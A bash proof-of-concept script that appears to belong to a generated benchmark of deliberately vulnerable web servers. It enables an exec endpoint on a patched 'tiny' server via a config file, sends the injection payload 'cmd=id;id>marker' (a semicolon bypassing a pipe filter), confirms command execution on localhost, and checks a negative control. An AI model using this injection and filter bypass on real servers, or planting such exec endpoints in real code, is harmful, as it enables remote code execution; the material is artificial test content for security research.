#!/usr/bin/env bash
# PoC for 131_tiny-web-server_C2I3S2
# Axes: C2 (config file gate) / I3 (struct dispatch) / S2 (pipe blocked; bypass with ;)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (tiny) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/tiny"
WWWROOT="/tmp/poc_131_www"
MARKER="/tmp/poc_131_marker"
CONF="/tmp/poc_131.conf"
PORT=18131

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { pkill -P "$SERVER_PID" 2>/dev/null || true; kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── write config file ──────────────────────────────────────────────────────────
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting tiny with --config $CONF on port $PORT..."
"$BINARY" --config "$CONF" "$WWWROOT" $PORT &
SERVER_PID=$!
sleep 0.4

# ── trigger (S2 bypass: use semicolon instead of pipe) ────────────────────────
echo "[*] sending payload: cmd=id;id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id;id>${MARKER}" > /dev/null || true

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: no --config means exec_cfg.enabled=0 → 404 ──────────────
echo "[*] verifying gate: endpoint must be absent without --config..."
NEG_PORT=19131
"$BINARY" "$WWWROOT" $NEG_PORT &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
pkill -P "$NEG_PID" 2>/dev/null || true; kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
